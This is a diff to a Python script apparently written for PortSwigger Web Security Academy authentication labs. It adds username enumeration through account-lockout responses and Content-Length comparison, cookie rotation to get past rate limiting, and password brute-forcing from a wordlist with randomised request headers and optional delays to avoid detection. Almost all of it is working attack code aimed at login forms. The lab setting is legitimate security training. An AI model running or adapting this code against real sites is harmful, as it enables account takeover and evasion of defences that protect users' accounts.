@@ -4,6 +4,8 @@ import random
 import time
 import sys
 import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
 
 # Disable warnings if no CA cert used (NOT RECOMMENDED outside Portswigger environment)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -133,6 +135,81 @@ def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_pat
     return slowest_username
 
 
+def find_username_account_lock(url, session, cookies, password, ca_cert_path=None):
+    """Enumerate usernames while bypassing rate-limiting."""
+    verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
+    proxies = get_proxies()
+    try:
+        with open("res/usernames.txt", "r") as file:
+            usernames = [line.strip() for line in file]
+    except FileNotFoundError:
+        print("Usernames file not found.")
+        return None
+    
+    failed_logins = {}  # Store usernames for failed requests
+
+    for username in usernames:
+        for attempt in range (5): 
+            headers, data = generate_random_session(username, password, url)
+            try:
+                response = session.post(
+                    url, 
+                    data=data, 
+                    headers=headers, 
+                    proxies=proxies, 
+                    cookies=cookies, 
+                    timeout=10, 
+                    verify=verify_setting,
+                    allow_redirects=False
+                )
+                # Use Content-Length header if available, otherwise calculate it
+                content_length = response.headers.get('Content-Length')
+                if content_length is None:
+                    content_length = len(response.content)
+                    
+                failed_logins[username] = content_length
+
+            except requests.exceptions.RequestException as e:
+                    print(f"Request failed for username: {username} with error: {e}")
+        print(f"{attempt + 1} login attempts with username: {username}\n"
+              f"Content length: {failed_logins[username]}")
+        
+        # time.sleep(random.uniform(1, 5))  # brute force detection aversion by adding a random delay
+
+    # Group users by message
+    grouped_by_message = {}
+    for user, message in failed_logins.items():
+        if message not in grouped_by_message:
+            grouped_by_message[message] = []
+        grouped_by_message[message].append(user)
+
+    # Print grouped messages
+    print("Content lengths grouped by usernames:")
+    for message, users in grouped_by_message.items():
+        print(f"Content Length: {message}")
+        print(f"Username: {', '.join(users)}")
+        print()
+    
+    anomalous = find_anomalous_content_length(failed_logins)
+    found_username = list(anomalous.keys())[0]
+    return found_username
+        
+
+def find_anomalous_content_length(failed_logins):
+    # Analyze the unique Content-Length values
+    unique_lengths = set(failed_logins.values())
+    
+    if len(unique_lengths) == 1:
+        # All values are the same
+        print("All Content-Length values are the same.")
+        return None
+    else:
+        # Return usernames with unique Content-Length values
+        anomalous = {user: length for user, length in failed_logins.items() if list(failed_logins.values()).count(length) == 1}
+        print(f"Anomalous Content-Lengths: {anomalous}")
+        return anomalous
+
+        
 def load_password_list():
     try:
         with open("res/passwords.txt", "r") as file:
@@ -143,48 +220,103 @@ def load_password_list():
     return passwords
 
 
+def rotate_cookies(session, url, ca_cert_path):
+    """Retrieve new cookies for each attempt to bypass rate-limiting."""
+    try:
+        response = session.get(url, verify=ca_cert_path)
+        response.raise_for_status()
+        cookies = session.cookies.get_dict()
+        print(f"New cookies obtained: {cookies}")
+        return cookies
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to obtain new cookies: {e}")
+        return None
+    
+    
 def brute_force_password(url, session, cookies, username, ca_cert_path=None):
     """Brute-force the password for a valid username."""
     verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
     proxies = get_proxies()
     passwords = load_password_list()
+    usernames = [username]
+
+    failed_logins = {}
 
     for password in passwords:
-        headers, data = generate_random_session(username, password, url)
-        try:
-            response = session.post(
-                url, 
-                data=data, 
-                headers=headers, 
-                proxies=proxies, 
-                cookies=cookies, 
-                timeout=10,
-                verify=verify_setting,
-                allow_redirects=False
-            )
-            print(f"Attempted password: {password} | Status Code: {response.status_code}")
-        
-            # Check for 302 status code
-            if response.status_code == 302:
-                print(f"Valid password found: {password}")
-                return password
-            
-            # Check for brute force detection message
-            elif "You have made too many incorrect login attempts." in response.text:
-                print("Brute force detected by server. Wait xx minutes.")
-                return None
-            
-            # Unknown response
-            else:
-                print(f"Failed login attempt for password: {password}")
-            
-        except requests.exceptions.RequestException as e:
-            print(f"Request failed for username: {user} with error: {e}")
+        for username in usernames: # Dummy alternator for brute force aversion
+            headers, data = generate_random_session(username, password, url)
+            try:
+                response = session.post(
+                    url, 
+                    data=data, 
+                    headers=headers, 
+                    proxies=proxies, 
+                    cookies=cookies, 
+                    timeout=10,
+                    verify=verify_setting,
+                    allow_redirects=False
+                )
+                # Use Content-Length header if available, otherwise calculate it
+                content_length = response.headers.get('Content-Length')
+                if content_length is None:
+                    content_length = len(response.content)
+                    
+                failed_logins[password] = content_length
                 
-        # time.sleep(random.uniform(1, 5)) # Random delay btw requests 1 to 5 sec 
+                print(
+                    f"Attempted password: {password} | "
+                    f"Status Code: {response.status_code} | "
+                    f"Content Length: {len(response.content)}"
+                )
+            
+                # Check for 200 status code (Login failed but no lockout detected)
+                if response.status_code == 200:
+                    if "Invalid username or password" in response.text:
+                        print(f"Failed login attempt for password: {password}")
+                    elif "You have made too many incorrect login attempts." in response.text:
+                        print("Brute force detected by server. Wait and retry later.")
+                    else:
+                        print(f"Unexpected 200 response for password: {password}")
+
+                # Check for 302 status code (Successful login)
+                elif response.status_code == 302:
+                    print(f"Valid password found: {password}")
+                    return password
+
+                # Check for 401 status code (Unauthorized)
+                elif response.status_code == 401:
+                    print(f"Unauthorized for password: {password}. Username may not exist.")
+
+                # Check for 429 status code (Rate-limiting)
+                elif response.status_code == 429:
+                    print("Rate-limiting detected. Adjust request rate or wait before retrying.")
+
+                # Catch-all for other status codes
+                else:
+                    print(f"Unexpected status code: {response.status_code} for password: {password}")
+
+            except requests.exceptions.RequestException as e:
+                print(f"Request failed for password: {password} with error: {e}")
+                    
+            # time.sleep(random.uniform(1, 5)) # Random delay btw requests 1 to 5 sec 
+            
+    # Group users by message
+    grouped_by_message = {}
+    for pwd, message in failed_logins.items():
+        if message not in grouped_by_message:
+            grouped_by_message[message] = []
+        grouped_by_message[message].append(pwd)
+
+    # Print grouped messages
+    print("Content lengths grouped by passwords:")
+    for message, pwd in grouped_by_message.items():
+        print(f"Content Length: {message}")
+        print(f"Passwords: {', '.join(pwd)}")
+        print()
     
-    print("Password brute-force unsuccessful.")
-    return None
+    anomalous = find_anomalous_content_length(failed_logins)
+    found_password = list(anomalous.keys())[0]
+    return found_password
 
 
 def alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target, ca_cert_path=None):
@@ -195,7 +327,7 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
     proxies = get_proxies()
     headers, data = generate_random_session(valid_user, valid_password, url)
     passwords = load_password_list()
-
+        
     for password in passwords:
         # Step 1: Login with credentials to reset brute-force counter
         print(f"Logging in with your account: {valid_user}")
@@ -263,14 +395,22 @@ def main():
 
 
     ### START: Lab -- Username enumeration via response timing ###
-    long_password = "howdy" * 20
-    username = find_username_bypass_rate_limit(url, session, cookies, long_password, ca_cert_path)
-
+    # dummy_password = "howdy" * 20
+    # username = find_username_bypass_rate_limit(url, session, cookies, dummy_password, ca_cert_path)
+    ###  END: Lab -- Username enumeration via response timing ###
+    
+    ### START: Lab -- Username enumeration via account lock ###
+    dummy_password = "howdy"
+    username = find_username_account_lock(url, session, cookies, dummy_password, ca_cert_path)
+    ### END: Lab -- Username enumeration via account lock ###
+    
+    # username = ""
+    
     if username:
         print(f"Possible username match --> {username}")
         while True:
             try:
-                choice = input("Should I brute force the password? [Y/n] ").strip().lower()
+                choice = input("Do you want to brute force the password? [Y/n] ").strip().lower()
                 if choice == "y":
                     password = brute_force_password(url, session, cookies, username, ca_cert_path)
                     print(f"Username: {username}")
